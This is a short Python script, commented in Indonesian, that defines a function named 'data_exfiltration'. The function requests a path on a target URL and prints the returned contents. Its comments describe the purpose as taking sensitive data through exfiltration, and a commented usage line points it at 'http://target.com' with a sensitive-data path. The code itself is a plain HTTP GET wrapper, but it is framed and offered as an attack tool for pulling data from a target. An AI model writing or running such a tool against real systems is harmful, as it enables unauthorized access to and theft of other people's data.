import requests

# Fungsi untuk mengambil data sensitif melalui exfiltration
def data_exfiltration(url, target_path):
    try:
        response = requests.get(url + target_path)
        if response.status_code == 200:
            print(f"Data exfiltrated from {target_path}:")
            print(response.text)
        else:
            print(f"Failed to exfiltrate data: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

# Contoh penggunaan:
# data_exfiltration("http://target.com", "/path/to/sensitive/data")
